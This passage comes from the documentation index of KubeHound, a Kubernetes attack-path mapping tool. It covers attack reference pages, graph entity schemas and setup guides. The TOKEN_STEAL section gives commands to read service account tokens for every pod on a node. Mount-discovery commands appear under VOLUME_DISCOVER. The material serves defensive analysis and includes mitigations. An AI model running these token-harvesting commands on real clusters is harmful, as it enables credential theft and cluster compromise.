/var/run/secrets/kubernetes.io/serviceaccount/token\n</code></pre>"},{"location":"reference/attacks/TOKEN_STEAL/#node_2","title":"Node","text":"<p>Steal access tokens for ALL pods running on the node:</p> <pre><code> find /var/lib/kubelet/pods/ -name token -type l 2&gt;/dev/null\n# /var/lib/kubelet/pods/5a9fc508-8410-444a-bf63-9f11e5979bee/volumes/kubernetes.io~projected/kube-api-access-225d6/token\n# /var/lib/kubelet/pods/a1176593-34a2-43e6-8bdd-ed10fa148fe7/volumes/kubernetes.io~projected/kube-api-access-ng6px/token\n# /var/lib/kubelet/pods/10b90d62-6b16-4aa7-9e72-75f18dcca5a8/volumes/kubernetes.io~projected/kube-api-access-j7dsp/token\n# /var/lib/kubelet/pods/dfbf38ad-2e92-44e0-b05\n</code></pre>"},{"location":"reference/attacks/TOKEN_STEAL/#defences","title":"Defences","text":""},{"location":"reference/attacks/TOKEN_STEAL/#monitoring","title":"Monitoring","text":"<ul> <li>Monitor for access to well-known K8s secrets paths from unusual processes.</li> </ul>"},{"location":"reference/attacks/TOKEN_STEAL/#prevent-service-account-token-automounting","title":"Prevent service account token automounting","text":"<p>When a pod is being created, it automatically mounts a service account (the default is default service account in the same namespace). Not every pod needs the ability to access the API from within itself.</p> <p>From version 1.6+ it is possible to prevent automounting of serviceaccount tokens on pods using:</p> <pre><code>apiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: sa1\nautomountServiceAccountToken: false\n</code></pre>"},{"location":"reference/attacks/TOKEN_STEAL/#calculation","title":"Calculation","text":"<ul> <li>TokenSteal</li> </ul>"},{"location":"reference/attacks/TOKEN_STEAL/#references","title":"References:","text":"<ul> <li>The Path Less Traveled: Abusing Kubernetes Defaults (Video)</li> <li>The Path Less Traveled: Abusing Kubernetes Defaults (GitHub)</li> <li>Securing Kubernetes Clusters by Eliminating Risky Permissions</li> </ul>"},{"location":"reference/attacks/VOLUME_ACCESS/","title":"VOLUME_ACCESS","text":""},{"location":"reference/attacks/VOLUME_ACCESS/#volume_access","title":"VOLUME_ACCESS","text":"Source Destination MITRE ATT&amp;CK Node Volume Container and Resource Discovery, T1613 <p>Represents an attacker with access to a node filesystem gaining access to any volumes mounted inside a container (by definition).</p>"},{"location":"reference/attacks/VOLUME_ACCESS/#details","title":"Details","text":"<p>Volumes can contains K8s API tokens or other resources useful to an attacker in building an attack path. This edge represents the link between a node and a mounted volume such that access to a node yields access to all exposed volumes for attack path calculations.</p>"},{"location":"reference/attacks/VOLUME_ACCESS/#prerequisites","title":"Prerequisites","text":"<p>A volume exposed to a container. Currently supports <code>HostPath</code> and <code>Projected</code> volume types.</p>"},{"location":"reference/attacks/VOLUME_ACCESS/#checks","title":"Checks","text":"<p>None.</p>"},{"location":"reference/attacks/VOLUME_ACCESS/#exploitation","title":"Exploitation","text":"<p>No exploitation is necessary. This edge simply indicates that a volume is exposed to a container and accessible from the node filesystem</p>"},{"location":"reference/attacks/VOLUME_ACCESS/#defences","title":"Defences","text":"<p>None</p>"},{"location":"reference/attacks/VOLUME_ACCESS/#calculation","title":"Calculation","text":"<ul> <li>VolumeAccess</li> </ul>"},{"location":"reference/attacks/VOLUME_ACCESS/#references","title":"References:","text":"<ul> <li>Official Kubernetes documentation: Volumes </li> </ul>"},{"location":"reference/attacks/VOLUME_DISCOVER/","title":"VOLUME_DISCOVER","text":""},{"location":"reference/attacks/VOLUME_DISCOVER/#volume_discover","title":"VOLUME_DISCOVER","text":"Source Destination MITRE ATT&amp;CK Container Volume Container and Resource Discovery, T1613 <p>Represents an attacker within a container discovering a mounted volume.</p>"},{"location":"reference/attacks/VOLUME_DISCOVER/#details","title":"Details","text":"<p>Volumes can contain K8s API tokens or other resources useful to an attacker in building an attack path.</p>"},{"location":"reference/attacks/VOLUME_DISCOVER/#prerequisites","title":"Prerequisites","text":"<p>A volume mounted into a container. Currently supports <code>HostPath</code> and <code>Projected</code> volume types.</p>"},{"location":"reference/attacks/VOLUME_DISCOVER/#checks","title":"Checks","text":"<p>Check for mounted volumes using procfs (format definition of output here):</p> <pre><code>cat /proc/self/mounts\n</code></pre> <p>Or use the mount command:</p> <pre><code>mount\n</code></pre> <p>Or use quarkslab/kdigger. Output here shows a mounted <code>proc</code> filesystem that is worth investigating:</p> <pre><code>kdigger dig mounts\n\n### MOUNT ###\nComments:\n- 23 devices are mounted.\n+-----------+---------------------------------+------------+---------------------------------+\n|   DEVICE  |               PATH              | FILESYSTEM |              FLAGS              |\n+-----------+---------------------------------+------------+---------------------------------+\n| overlay   | /                               | overlay    | rw,relatime,lowerdir=/var/lib/c |\n|           |                                 |            | ontainerd/io.containerd.snapsho |\n|           |                                 |            | tter.v1.overlayfs/snapshots/27/ |\n|           |                                 |            | fs,upperdir=/var/lib/containerd |\n|           |                                 |            | /io.containerd.snapshotter.v1.o |\n|           |                                 |            | verlayfs/snapshots/71/fs,workdi |\n|           |                                 |            | r=/var/lib/containerd/io.contai |\n|           |                                 |            | nerd.snapshotter.v1.overlayfs/s |\n|           |                                 |            | napshots/71/work                |\n| proc      | /proc                           | proc       | rw,nosuid,nodev,noexec,relatime |\n| tmpfs     | /dev                            | tmpfs      | rw,nosuid,size=65536k,mode=755  |\n| devpts    | /dev/pts                        | devpts     | rw,nosuid,noexec,relatime,gid=5 |\n|           |                                 |            | ,mode=620,ptmxmode=666          |\n| mqueue    | /dev/mqueue                     | mqueue     | rw,nosuid,nodev,noexec,relatime |\n| sysfs     | /sys                            | sysfs      | ro,nosuid,nodev,noexec,relatime |\n| cgroup    | /sys/fs/cgroup                  | cgroup2    | ro,nosuid,nodev,noexec,relatime |\n| proc      | /hostproc                       | proc       | rw,nosuid,nodev,noexec,relatime |\n| /dev/vda1 | /etc/hosts                      | ext4       | rw,relatime                     |\n| /dev/vda1 | /dev/termination-log            | ext4       | rw,relatime                     |\n| /dev/vda1 | /etc/hostname                   | ext4       | rw,relatime                     |\n| /dev/vda1 | /etc/resolv.conf                | ext4       | rw,relatime                     |\n| shm       | /dev/shm                        | tmpfs      | rw,nosuid,nodev,noexec,relatime |\n|           |                                 |            | ,size=65536k                    |\n| tmpfs     | /run/secrets/kubernetes.io/serv | tmpfs      | ro,relatime,size=8039936k       |\n|           | iceaccount                      |            |                                 |\n| proc      | /proc/bus                       | proc       | ro,nosuid,nodev,noexec,relatime |\n| proc      | /proc/fs                        | proc       | ro,nosuid,nodev,noexec,relatime |\n| proc      | /proc/irq                       | proc       | ro,nosuid,nodev,noexec,relatime |\n| proc      | /proc/sys                       | proc       | ro,nosuid,nodev,noexec,relatime |\n| proc      | /proc/sysrq-trigger             | proc       | ro,nosuid,nodev,noexec,relatime |\n| tmpfs     | /proc/kcore                     | tmpfs      | rw,nosuid,size=65536k,mode=755  |\n| tmpfs     | /proc/keys                      | tmpfs      | rw,nosuid,size=65536k,mode=755  |\n| tmpfs     | /proc/timer_list                | tmpfs      | rw,nosuid,size=65536k,mode=755  |\n| tmpfs     | /sys/firmware                   | tmpfs      | ro,relatime                     |\n+-----------+---------------------------------+------------+---------------------------------+\n</code></pre>"},{"location":"reference/attacks/VOLUME_DISCOVER/#exploitation","title":"Exploitation","text":"<p>No exploitation is necessary. This edge simply indicates that a volume is mounted within a container.</p>"},{"location":"reference/attacks/VOLUME_DISCOVER/#defences","title":"Defences","text":"<p>None</p>"},{"location":"reference/attacks/VOLUME_DISCOVER/#calculation","title":"Calculation","text":"<ul> <li>VolumeDiscover</li> </ul>"},{"location":"reference/attacks/VOLUME_DISCOVER/#references","title":"References:","text":"<ul> <li>Official Kubernetes documentation: Volumes </li> </ul>"},{"location":"reference/entities/","title":"Entities","text":"<p>Tne entities represents all the vertices in KubeHound graph model. Those are an abstract representation of a Kubernetes component that form the vertices of the graph.</p>"},{"location":"reference/entities/#entities_1","title":"Entities","text":"<p>Note</p> <p>For instance: PERMISSION_SET is an abstract of Role and RoleBinding.</p> ID Description COMMON Common properties can be set on any vertices within the graph. CONTAINER A container image running on a Kubernetes pod. Containers in a Pod are co-located and co-scheduled to run on the same node. ENDPOINT A network endpoint exposed by a container accessible via a Kubernetes service, external node port or cluster IP/port tuple. IDENTITY Identity represents a Kubernetes user or service account. NODE A Kubernetes node. Kubernetes runs workloads by placing containers into Pods to run on Nodes. A node may be a virtual or physical machine, depending on the cluster. PERMISSION_SET A permission set represents a Kubernetes RBAC <code>Role</code> or <code>ClusterRole</code>, which contain rules that represent a set of permissions that has been bound to an identity via a <code>RoleBinding</code> or <code>ClusterRoleBinding</code>. Permissions are purely additive (there are no \"deny\" rules). POD A Kubernetes pod - the smallest deployable units of computing that you can create and manage in Kubernetes. Volume Volume represents a volume mounted in a container and exposed by a node."},{"location":"reference/entities/common/","title":"Common Properties","text":"<p>Common properties can be set on any vertices within the graph.</p>"},{"location":"reference/entities/common/#ownership-information","title":"Ownership Information","text":"Property Type Description app <code>string</code> Internal app name extracted from object labels team <code>string</code> Internal team name extracted from object labels service <code>string</code> Internal service name extracted from object labels"},{"location":"reference/entities/common/#risk-information","title":"Risk Information","text":"Property Type Description critical <code>bool</code> Whether the vertex is a critical asset within the cluster. Critical assets form the termination condition of an attack path and represent an asset that leads to complete cluster compromise compromised <code>int</code> Enum defining asset compromise for scenario-based simulations"},{"location":"reference/entities/common/#store-information","title":"Store Information","text":"Property Type Description storeID <code>string</code> Unique store database identifier of the store objected generating the vertex"},{"location":"reference/entities/common/#namespace-information","title":"Namespace Information","text":"Property Type Description namespace <code>string</code> Kubernetes namespace to which the object (or its parent) belongs isNamespaced <code>bool</code> Whether or not the object has an associated namespace"},{"location":"reference/entities/common/#run-information","title":"Run Information","text":"Property Type Description runID <code>string</code> Unique ULID identifying a KubeHound run cluster <code>string</code> Kubernetes cluster to which the entity belongs"},{"location":"reference/entities/container/","title":"Container","text":"<p>A container image running on a Kubernetes pod. Containers in a Pod are co-located and co-scheduled to run on the same node.</p> <p>Properties that are interesting to attackers can be set at a Pod level such as hostPid, or container level such a capabilities. To simplify the graph model, the container node is chosen as the single source of truth for all host security related information. Any capabilities derived from the containing Pod are set ONLY on the container (and inheritance/override rules applied)</p>"},{"location":"reference/entities/container/#properties","title":"Properties","text":"Property Type Description name <code>string</code> Name of the container in Kubernetes image <code>string</code> Docker the image run by the container command <code>[]string</code> The container entrypoint args <code>[]string</code> List of arguments passed to the container capabilities <code>[]string</code> List of additional capabilities added to the container via k8s securityContext privileged <code>bool</code> Whether the container is run in privileged mode privesc <code>bool</code> Whether the container can gain more privileges than its parent process details here hostPid <code>bool</code> Whether the container can access the host's PID namespace hostIpc <code>bool</code> Whether the container can access the host's IPC namespace hostNetwork <code>bool</code> Whether the container can access the host's network namespace runAsUser <code>int64</code> The user account the container is running under e.g 0 for root ports <code>[]string</code> List of ports exposed by the container pod <code>string</code> The name of the pod running the container node <code>string</code> The name of the node running the container"},{"location":"reference/entities/container/#common-properties","title":"Common Properties","text":"<ul> <li>app</li> <li>cluster</li> <li>compromised</li> <li>isNamespaced</li> <li>namespace</li> <li>runID</li> <li>service</li> <li>storeID</li> <li>team</li> </ul>"},{"location":"reference/entities/container/#definition","title":"Definition","text":"<p>vertex.Container</p>"},{"location":"reference/entities/container/#references","title":"References","text":"<ul> <li>Official Kubernetes documentation: Containers</li> </ul>"},{"location":"reference/entities/endpoint/","title":"Endpoint","text":"<p>A network endpoint exposed by a container accessible via a Kubernetes service, external node port or cluster IP/port tuple.</p>"},{"location":"reference/entities/endpoint/#properties","title":"Properties","text":"Property Type Description name <code>string</code> Unique endpoint name serviceEndpoint <code>string</code> Name of the service if the endpoint is exposed outside the cluster via an endpoint slice serviceDns <code>string</code> FQDN of the service if the endpoint is exposed outside the cluster via an endpoint slice addressType <code>string</code> Type of the addresses array (IPv4, IPv6, etc) addresses <code>string</code> Array of addresses exposing the endpoint port <code>int</code> Exposed port of the endpoint portName <code>string</code> Name of the exposed port protocol <code>string</code> Endpoint protocol (TCP, UDP, etc) exposure <code>string</code> Enum value describing the level of exposure of the endpoint (see EndpointExposureType)"},{"location":"reference/entities/endpoint/#common-properties","title":"Common Properties","text":"<ul> <li>app</li> <li>cluster</li> <li>compromised</li> <li>isNamespaced</li> <li>namespace</li> <li>runID</li> <li>service</li> <li>storeID</li> <li>team</li> </ul>"},{"location":"reference/entities/endpoint/#definition","title":"Definition","text":"<p>vertex.Endpoint</p>"},{"location":"reference/entities/endpoint/#references","title":"References","text":"<ul> <li>Official Kubernetes documentation</li> <li>Exposing Kubernetes Applications</li> </ul>"},{"location":"reference/entities/identity/","title":"Identity","text":"<p>Identity represents a Kubernetes user or service account.</p>"},{"location":"reference/entities/identity/#properties","title":"Properties","text":"Property Type Description name <code>string</code> Name of the identity principal in Kubernetes type <code>string</code> Type of identity (user, serviceaccount, group)"},{"location":"reference/entities/identity/#common-properties","title":"Common Properties","text":"<ul> <li>app</li> <li>cluster</li> <li>critical</li> <li>isNamespaced</li> <li>namespace</li> <li>runID</li> <li>service</li> <li>storeID</li> <li>team</li> </ul>"},{"location":"reference/entities/identity/#definition","title":"Definition","text":"<p>vertex.Identity</p>"},{"location":"reference/entities/identity/#references","title":"References","text":"<ul> <li>Official Kubernetes documentation I: Authorization Overview </li> <li>Official Kubernetes documentation II: RBAC</li> </ul>"},{"location":"reference/entities/node/","title":"Node","text":"<p>A Kubernetes node. Kubernetes runs workloads by placing containers into Pods to run on Nodes. A node may be a virtual or physical machine, depending on the cluster.</p>"},{"location":"reference/entities/node/#properties","title":"Properties","text":"Property Type Description name <code>string</code> Name of the node in Kubernetes"},{"location":"reference/entities/node/#common-properties","title":"Common Properties","text":"<ul> <li>app</li> <li>cluster</li> <li>compromised</li> <li>critical</li> <li>isNamespaced</li> <li>namespace</li> <li>runID</li> <li>service</li> <li>storeID</li> <li>team</li> </ul>"},{"location":"reference/entities/node/#definition","title":"Definition","text":"<p>vertex.Node</p>"},{"location":"reference/entities/node/#references","title":"References","text":"<ul> <li>Official Kubernetes documentation </li> </ul>"},{"location":"reference/entities/permissionset/","title":"PermissionSet","text":"<p>A permission set represents a Kubernetes RBAC <code>Role</code> or <code>ClusterRole</code>, which contain rules that represent a set of permissions that has been bound to an identity via a <code>RoleBinding</code> or <code>ClusterRoleBinding</code>. Permissions are purely additive (there are no \"deny\" rules).</p>"},{"location":"reference/entities/permissionset/#properties","title":"Properties","text":"Property Type Description name <code>string</code> Name of the underlying role in Kubernetes rules <code>[]string</code> List of strings representing the access granted by the role (see generator function flattenPolicyRules)"},{"location":"reference/entities/permissionset/#common-properties","title":"Common Properties","text":"<ul> <li>app</li> <li>cluster</li> <li>critical</li> <li>isNamespaced</li> <li>namespace</li> <li>runID</li> <li>service</li> <li>storeID</li> <li>team</li> </ul>"},{"location":"reference/entities/permissionset/#definition","title":"Definition","text":"<p>vertex.PermissionSet</p>"},{"location":"reference/entities/permissionset/#references","title":"References","text":"<ul> <li>Official Kubernetes documentation </li> </ul>"},{"location":"reference/entities/pod/","title":"Pod","text":"<p>A Kubernetes pod - the smallest deployable units of computing that you can create and manage in Kubernetes.</p>"},{"location":"reference/entities/pod/#properties","title":"Properties","text":"Property Type Description name <code>string</code> Name of the pod in Kubernetes shareProcessNamespace <code>bool</code> whether all the containers in the pod share a process namespace (details here) serviceAccount <code>string</code> The name of the <code>serviceaccount</code> used to run this pod. See Kubernetes documentation for further details node <code>string</code> The name of the node running the pod"},{"location":"reference/entities/pod/#common-properties","title":"Common Properties","text":"<ul> <li>app</li> <li>cluster</li> <li>compromised</li> <li>critical</li> <li>isNamespaced</li> <li>namespace</li> <li>runID</li> <li>service</li> <li>storeID</li> <li>team</li> </ul>"},{"location":"reference/entities/pod/#definition","title":"Definition","text":"<p>vertex.Pod</p>"},{"location":"reference/entities/pod/#references","title":"References","text":"<ul> <li>Official Kubernetes documentation </li> </ul>"},{"location":"reference/entities/volume/","title":"Volume","text":"<p>Volume represents a volume mounted in a container and exposed by a node.</p>"},{"location":"reference/entities/volume/#properties","title":"Properties","text":"Property Type Description name <code>string</code> Name of the volume mount in the container spec type <code>string</code> Type of volume mount (host/projected/etc). See Kubernetes documentation for details sourcePath <code>string</code> The path of the volume in the host (i.e node) filesystem mountPath <code>string</code> The path of the volume in the container filesystem readonly <code>bool</code> Whether the volume has been mounted with <code>readonly</code> access"},{"location":"reference/entities/volume/#common-properties","title":"Common Properties","text":"<ul> <li>app</li> <li>cluster</li> <li>isNamespaced</li> <li>namespace</li> <li>runID</li> <li>service</li> <li>storeID</li> <li>team</li> </ul>"},{"location":"reference/entities/volume/#definition","title":"Definition","text":"<p>vertex.Volume</p>"},{"location":"reference/entities/volume/#references","title":"References","text":"<ul> <li>Official Kubernetes documentation </li> </ul>"},{"location":"reference/graph/","title":"Reference","text":""},{"location":"reference/graph/#graph-model","title":"Graph model","text":"<p>In the diagram below, you can see how the KubeHound graph model organizes entities  as nodes and attack paths as the edges that connect them. This structure not only  makes it easier to visualize the attack surface but also powers Gremlin queries  to actively explore and analyze security weaknesses across your Kubernetes  infrastructure.</p> <p> Graph Model </p>"},{"location":"reference/graph/#graph-database","title":"Graph Database","text":"<ul> <li>JanusGraph schema</li> <li>Programmatically parsable schema</li> </ul>"},{"location":"user-guide/advanced-configuration/","title":"Advanced configuration","text":""},{"location":"user-guide/advanced-configuration/#running-kubehound-from-source","title":"Running KubeHound from source","text":"<p>Clone the KubeHound repository and build KubeHound using the makefile:</p> <pre><code>git clone https://github.com/DataDog/KubeHound.git\ncd KubeHound\nmake build\n</code></pre> <p>The built binary is now available at:</p> <pre><code>bin/build/kubehound\n</code></pre> <p>Warning</p> <p>We do not advise to build KubeHound from the sources as the docker images will use the latest flag instead of a specific release version. This mainly used by the developers/maintainers of KubeHound.</p>"},{"location":"user-guide/advanced-configuration/#configuration","title":"Configuration","text":"<p>When using KubeHound you can setup different options through a config file with <code>-c</code> flags. You can use kubehound-reference.yaml as an example which list every options possible.</p>"},{"location":"user-guide/advanced-configuration/#collector-configuration","title":"Collector configuration","text":"<p>KubeHound is supporting 2 type of collector:</p> <ul> <li><code>file-collector</code>: The file collector which can process an offline dump (made by KubeHound - see common operation for the dump command).</li> <li><code>live-k8s-api-collector</code> (by default): The live k8s collector which will retrieve all kubernetes objects from the k8s API.</li> </ul>"},{"location":"user-guide/advanced-configuration/#file-collector","title":"File Collector","text":"<p>To use the file collector, you just have to specify:</p> <ul> <li><code>directory</code>: directory holding the K8s json data files</li> </ul> <p>Tip</p> <p>If you want to ingest data from a previous dump, we advise you to use <code>ingest local</code> command - more detail here.</p> <p>deprecated</p> <p>The <code>cluster</code> field is deprecated since v1.5.0. Now a metadata.json is being embeded with the cluster name. If you are using an old dump you can overwrite it using the <code>dynamic</code> section from the config file or just manually the <code>metadata.json</code> file.</p>"},{"location":"user-guide/advanced-configuration/#live-collector","title":"Live Collector","text":"<p>When retrieving the kubernetes resources form the k8s API, KubeHound setup limitation to avoid resources exhaustion on the k8s API:</p> <ul> <li><code>rate_limit_per_second</code> (by default <code>50</code>): Rate limit of requests/second to the Kubernetes API.</li> <li><code>page_size</code> (by default <code>500</code>): Number of entries retrieved by each call on the API (same for all Kubernetes entry types)</li> <li><code>page_buffer_size</code> (by default <code>10</code>): Number of pages to buffer</li> </ul> <p>Note</p> <p>Most (&gt;90%) of the current runtime of KubeHound is spent in the transfer of data from the remote K8s API server, and the bulk of that is spent waiting on rate limit. As such increasing <code>rate_limit_per_second</code> will improve performance roughly linearly.</p> <p>Tip</p> <p>You can disable the interactive mod with <code>non_interactive</code> set to true. This will automatically dump all k8s resources from the k8s API without any user interaction.</p>"},{"location":"user-guide/advanced-configuration/#builder","title":"Builder","text":"<p>The <code>builder</code> section allows you to customize how you want to chunk the data during the ingestion process. It is being splitted in 2 sections <code>vertices</code> and <code>edges</code>. For both graph entities, KubeHound uses a <code>batch_size</code> of <code>500</code> element by default.</p> <p>Warning</p> <p>Increasing batch sizes can have some performance improvements by reducing network latency in transferring data between KubeGraph and the application. However, increasing it past a certain level can overload the backend leading to instability and eventually exceed the size limits of the websocket buffer used to transfer the data. Changing the default following setting is not recommended.</p>"},{"location":"user-guide/advanced-configuration/#vertices-builder","title":"Vertices builder","text":"<p>For the vertices builder, there is 2 options:</p> <ul> <li><code>batch_size_small</code> (by default <code>500</code>): to control the batch size of vertices you want to insert through</li> <li><code>batch_size_small</code> (by default <code>100</code>): handle only the PermissionSet resouces. This resource is quite intensive because it is the only requirering aggregation between multiples k8s resources (from <code>roles</code> and <code>rolebindings</code>).</li> </ul> <p>Note</p> <p>Since there is expensive insert on vertices the <code>batch_size_small</code> is currently not used.</p>"},{"location":"user-guide/advanced-configuration/#edges-builder","title":"Edges builder","text":"<p>By default, KubeHound will optimize the attack paths for large cluster by using <code>large_cluster_optimizations</code> (by default <code>true</code>). This will limit the number of attack paths being build in the targetted cluster. Using this optimisation will remove some attack paths. For instance, for the token based attacks (i.e. <code>TOKEN_BRUTEFORCE</code>), the optimisation will build only edges (between permissionSet and Identity) only if the targetted identity is <code>system:masters</code> group. This will reduce redundant attack paths:</p> <ul> <li>If the <code>large_cluster_optimizations</code> is activated, KubeHound will use the default <code>batch_size</code> (by default `500).</li> <li>If the <code>large_cluster_optimizations</code> is deactivated, KubeHound will use a specific batch size configured through <code>batch_size_cluster_impact</code> for all attacks that make the graph grow exponentially.</li> </ul> <p>Lastly, the graph builder is using pond library under the hood to handle the asynchronous tasks of inserting edges:</p> <ul> <li><code>worker_pool_size</code> (by default <code>5</code>): parallels ingestion process running at the same time (number of workers).</li> <li><code>worker_pool_capacity</code> (by default <code>100</code>): number of cached elements in the worker pool.</li> </ul>"},{"location":"user-guide/common-operations/","title":"Local Common Operations","text":"<p>When running <code>./kubehound</code>, it will execute the 3 following action:</p> <ul> <li>run the <code>backend</code> (graphdb, storedb and UI)</li> <li><code>dump</code> the kubernetes resources needed to build the graph</li> <li><code>ingest</code> the dumped data and generate the attack path for the targeted Kubernetes cluster.</li> </ul> <p>All those 3 steps can be run separately.</p> <p></p> <p>Note</p> <p>if you want to skip the interactive mode, you can provide <code>-y</code> or <code>--non-interactive</code> to skip the cluster confirmation.</p>"},{"location":"user-guide/common-operations/#backend","title":"Backend","text":"<p>In order to run, KubeHound needs some docker containers to be running. Every commands has been embedded into KubeHound to simplify the user experience. You can find all the docker-compose used here.</p>"},{"location":"user-guide/common-operations/#starting-the-backend","title":"Starting the backend","text":""},{"location":"user-guide/common-operations/#starting-the-backend-with-default-images","title":"Starting the backend with default images","text":"<p>The backend stack can be started by using:</p> <pre><code>kubehound backend up\n</code></pre> <p>It will use the latest kubehound images releases</p>"},{"location":"user-guide/common-operations/#starting-the-backend-with-overrides","title":"Starting the backend with overrides","text":"<p>For various reasons, you might want to use a specific version or pull the image from a specific registry. You can override the default behaviour by using the following <code>docker-compose.overrides.yaml</code> file:</p> <pre><code>name: kubehound-release\nservices:\n  mongodb:\n    image: your.registry.tld/mongo/mongo:6.0.6\n    ports:\n      - \"127.0.0.1:27017:27017\"\n\n  kubegraph:\n    image: your.registry.tld/datadog/kubehound-graph:my-specific-tag\n    ports:\n      - \"127.0.0.1:8182:8182\"\n      - \"127.0.0.1:8099:8099\"\n\n  ui-jupyter:\n    image: your.registry.tld/datadog/kubehound-ui:my-specific-tag\n\n  ui-invana-engine:\n    image: your.registry.tld/invanalabs/invana-engine:latest\n\n  ui-invana-studio:\n    image: your.registry.tld/invanalabs/invana-studio:latest\n</code></pre> <p>Then you can start the backend with the following command:</p> <pre><code>kubehound backend up -f docker-compose.overrides.yml\n</code></pre>"},{"location":"user-guide/common-operations/#restartingstopping-the-backend","title":"Restarting/stopping the backend","text":"<p>The backend stack can be restarted by using:</p> <pre><code>kubehound backend reset\n</code></pre> <p>or just stopped:</p> <pre><code>kubehound backend down\n</code></pre> <p>These commands will simply reboot backend services, but persist the data via docker volumes.</p>"},{"location":"user-guide/common-operations/#wiping-the-database","title":"Wiping the database","text":"<p>The backend data can be wiped by using:</p> <pre><code>kubehound backend wipe\n</code></pre> <p>Warning</p> <p>This command will wipe ALL docker DATA (docker volume and containers) and will not be recoverable.</p>"},{"location":"user-guide/common-operations/#dump","title":"Dump","text":""},{"location":"user-guide/common-operations/#create-a-dump-localy-with-all-needed-k8s-resources","title":"Create a dump localy with all needed k8s resources","text":"<p>For instance, if you want to dump a configuration to analyse it later or just on another computer, KubeHound can create a self sufficient dump with the Kubernetes resources needed. By default it will create a <code>.tar.gz</code> file with all the dumper k8s resources needed.</p> <pre><code>kubehound dump local [directory to dump the data]\n</code></pre> <p>If for some reasons you need to have the raw data, you can add <code>--no-compress</code> flag to have a raw extract.</p> <p>Note</p> <p>This step does not require any backend as it only automate grabbing k8s resources from the k8s api.</p>"},{"location":"user-guide/common-operations/#ingest","title":"Ingest","text":""},{"location":"user-guide/common-operations/#ingest-a-local-dump","title":"Ingest a local dump","text":"<p>To ingest manually an extraction made by KubeHound, just specify where the dump is being located and the associated cluster name.</p> <pre><code>kubehound ingest local [directory or tar.gz path]\n</code></pre> <p>Warning</p> <p>This step requires the backend to be started, it will not start it for you.</p> <p>deprecated</p> <p>The <code>--cluster</code> is deprecated since v1.5.0. Now a metadata.json is being embeded with the cluster name. If you are using old dump you can either still use the <code>--cluster</code> flag or auto detect it from the path.</p>"},{"location":"user-guide/getting-started/","title":"Getting started","text":""},{"location":"user-guide/getting-started/#prerequisites","title":"Prerequisites","text":"<p>To get started with KubeHound, you'll need the following pre-requirements on your system:</p> <ul> <li>Docker &gt;= 19.03 (<code>docker version</code>)</li> <li>Docker Compose &gt;= v2.0 (<code>docker compose version</code>)</li> </ul> <p>These two are used to start the backend infrastructure required to run KubeHound. It also provides a default user interface via Jupyter notebooks.</p>"},{"location":"user-guide/getting-started/#running-kubehound","title":"Running KubeHound","text":"<p>KubeHound ships with a sensible default configuration as well as a pre-built binary, designed to get new users up and running quickly.</p> <p>Download the latest KubeHound binary for you platform:</p> <pre><code>wget https://github.com/DataDog/KubeHound/releases/latest/download/kubehound-$(uname -o | sed 's/GNU\\///g')-$(uname -m) -O kubehound\nchmod +x kubehound\n</code></pre> <p>Then just run <code>./kubehound</code>, it will start backend services via docker compose v2 API.</p> <p>Next, make sure your current kubectl context points at the target cluster:</p> <pre><code># View the current context\nkubectl config current-context\n\n# Set your context\nkubectl config set-context &lt;name&gt;\n\n# alternatively, use https://github.com/ahmetb/kubectx\n</code></pre> <p>Finally, run KubeHound with the default configuration:</p> <pre><code>kubehound\n</code></pre> <p>Sample output:</p> <pre><code>./kubehound\nINFO[01:42:19] Loading application configuration from default embedded\nWARN[01:42:19] No local config file was found (kubehound.yaml)\nINFO[01:42:19] Using /home/datadog/kubehound for default config\nINFO[01:42:19] Initializing application telemetry\nWARN[01:42:19] Telemetry disabled via configuration\nINFO[01:42:19] Loading backend from default embedded\nWARN[01:42:19] Loading the kubehound images with tag latest - dev branch detected\nINFO[01:42:19] Spawning the kubehound stack\n[+] Running 3/3\n \u2714 Container kubehound-release-kubegraph-1 Healthy                                                                                                                                                                              50.3s\n \u2714 Container kubehound-release-ui-jupyter-1  Healthy                                                                                                                                                                              50.3s\n \u2714 Container kubehound-release-mongodb-1     Healthy                                                                                                                                                                              58.4s\nINFO[01:43:20] Starting KubeHound (run_id: 01j4fwbg88j6eptasgegdh2sgs)\nINFO[01:43:20] Initializing providers (graph, cache, store)\nINFO[01:43:20] Loading cache provider\nINFO[01:43:20] Loaded memcache cache provider\nINFO[01:43:20] Loading store database provider\nINFO[01:43:20] Loaded mongodb store provider\nINFO[01:43:21] Loading graph database provider\nINFO[01:43:21] Loaded janusgraph graph provider\nINFO[01:43:21] Running the ingestion pipeline\nINFO[01:43:21] Loading Kubernetes data collector client\nWARN[01:43:21] About to dump k8s cluster: \"kind-kubehound.test.local\" - Do you want to continue ? [Yes/No]\nyes\nINFO[01:43:30] Loaded k8s-api-collector collector client\nINFO[01:43:30] Starting Kubernetes raw data ingest\nINFO[01:43:30] Loading data ingestor\nINFO[01:43:30] Running dependency health checks\nINFO[01:43:30] Running data ingest and normalization\nINFO[01:43:30] Starting ingest sequences\nINFO[01:43:30] Waiting for ingest sequences to complete\nINFO[01:43:30] Running ingestor sequence core-pipeline\nINFO[01:43:30] Starting ingest sequence core-pipeline\nINFO[01:43:30] Running ingest group k8s-role-group\nINFO[01:43:30] Starting k8s-role-group ingests\nINFO[01:43:30] Waiting for k8s-role-group ingests to complete\nINFO[01:43:30] Running ingest k8s-role-ingest\nINFO[01:43:30] Running ingest k8s-cluster-role-ingest\nINFO[01:43:30] Streaming data from the K8s API\nINFO[01:43:32] Completed k8s-role-group ingest\nINFO[01:43:32] Finished running ingest group k8s-role-group\n...\nINFO[01:43:35] Completed k8s-pod-group ingest\nINFO[01:43:35] Finished running ingest group k8s-pod-group\nINFO[01:43:35] Completed ingest sequence core-pipeline\nINFO[01:43:35] Completed pipeline ingest\nINFO[01:43:35] Completed data ingest and normalization in 5.065238542s\nINFO[01:43:35] Loading graph edge definitions\nINFO[01:43:35] Loading graph builder\nINFO[01:43:35] Running dependency health checks\nINFO[01:43:35] Constructing graph\nWARN[01:43:35] Using large cluster optimizations in graph construction\nINFO[01:43:35] Starting mutating edge construction\nINFO[01:43:35] Building edge PodCreate\nINFO[01:43:36] Edge writer 10 PodCreate::POD_CREATE written\nINFO[01:43:36] Building edge PodExec\n...\nINFO[01:43:36] Starting dependent edge construction\nINFO[01:43:36] Building edge ContainerEscapeVarLogSymlink\nINFO[01:43:36] Edge writer 5 ContainerEscapeVarLogSymlink::CE_VAR_LOG_SYMLINK written\nINFO[01:43:36] Completed edge construction\nINFO[01:43:36] Completed graph construction in 773.2935ms\nINFO[01:43:36] Stats for the run time duration: 5.838839708s / wait: 5.926496s / throttling: 101.501262%\nINFO[01:43:36] KubeHound run 